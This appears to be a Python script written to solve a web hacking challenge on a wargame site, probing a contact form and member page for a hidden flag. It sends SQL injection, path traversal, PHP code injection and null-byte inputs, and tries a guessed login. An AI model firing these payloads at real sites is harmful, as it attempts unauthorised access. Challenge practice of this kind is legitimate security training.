#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup

s = requests.Session()
base = "https://vip.hax.w3challs.com/"

print("[*] Testing member access after contact...")

# First, access member without contact
r_before = s.get(f"{base}index.php?page=member")
print(f"Member page before contact: {len(r_before.text)} bytes")

# Send contact to each recipient and check member access
recipients = {
    '1': 'LuG[3]R - Army Chief',
    '2': 'Fr[4]Ger - Admiral', 
    '3': 'K[1]LLeR - Commander'
}

for recipient_id, recipient_name in recipients.items():
    print(f"\n[*] Testing with recipient {recipient_id} ({recipient_name})...")
    
    # Fresh session for each test
    s = requests.Session()
    
    # Send contact message
    contact_data = {
        'recipient': recipient_id,
        'msg': 'test'
    }
    r_contact = s.post(f"{base}index.php?page=contact", data=contact_data)
    
    # Now check member page
    r_member = s.get(f"{base}index.php?page=member")
    
    print(f"  Member page after contact: {len(r_member.text)} bytes")
    
    if len(r_member.text) != len(r_before.text):
        print(f"  [!] DIFFERENT CONTENT!")
        
        # Parse and show the difference
        soup = BeautifulSoup(r_member.text, 'html.parser')
        corps = soup.find('div', {'id': 'corps'})
        if corps:
            content = corps.get_text(strip=True)
            print(f"  Corps content: {content}")
            
            # Check for forms
            forms = corps.find_all('form')
            for form in forms:
                print(f"  Form found!")
                for inp in form.find_all('input'):
                    print(f"    Input: {inp}")
            
            # Check for any interesting text
            if 'password' in content.lower() or 'token' in content.lower() or 'code' in content.lower():
                print(f"  [!!!] Authentication form found!")
            
            if 'flag' in content.lower():
                print(f"  [!!!] FLAG MENTIONED!")
                print(f"  Full content: {content}")

# Test with different messages
print("\n[*] Testing with specific messages...")

special_messages = [
    "I want to join",
    "password",
    "admin",
    "' OR '1'='1",
    "../etc/passwd",
    "<?php phpinfo(); ?>",
    "LuG[3]R",
    "give me access",
    "member",
    "flag"
]

for msg in special_messages:
    s = requests.Session()
    
    # Send contact with special message
    contact_data = {
        'recipient': '1',
        'msg': msg
    }
    r_contact = s.post(f"{base}index.php?page=contact", data=contact_data)
    
    # Check member page
    r_member = s.get(f"{base}index.php?page=member")
    
    if len(r_member.text) > 1000:
        print(f"[!] Large member response with message: {msg}")
        soup = BeautifulSoup(r_member.text, 'html.parser')
        corps = soup.find('div', {'id': 'corps'})
        if corps:
            content = corps.get_text(strip=True)
            if content and 'Welcome to' not in content:
                print(f"  Content: {content[:200]}")

# Test accessing member with null byte after contact
print("\n[*] Testing member with null byte after contact...")

s = requests.Session()

# Send contact
contact_data = {'recipient': '1', 'msg': 'test'}
r_contact = s.post(f"{base}index.php?page=contact", data=contact_data)

# Try member with null byte
r_member_null = s.get(f"{base}index.php?page=member%00")
print(f"Member with null byte: {len(r_member_null.text)} bytes")

soup = BeautifulSoup(r_member_null.text, 'html.parser')
corps = soup.find('div', {'id': 'corps'})
if corps:
    content = corps.get_text(strip=True)
    if content:
        print(f"Content: {content}")

# Test if contact creates a session variable
print("\n[*] Checking session after contact...")

s = requests.Session()

# Get initial session
r1 = s.get(f"{base}")
print(f"Initial session: {dict(s.cookies)}")

# Send contact
contact_data = {'recipient': '1', 'msg': 'test'}
r2 = s.post(f"{base}index.php?page=contact", data=contact_data)
print(f"Session after contact: {dict(s.cookies)}")

# Try login after contact
login_data = {'login': 'LuG[3]R', 'pass': 'password'}
r3 = s.post(f"{base}index.php?page=login", data=login_data)
print(f"Session after login: {dict(s.cookies)}")

# Check member
r4 = s.get(f"{base}index.php?page=member")
if 'flag' in r4.text.lower():
    print(f"[!!!] FLAG FOUND: {r4.text}")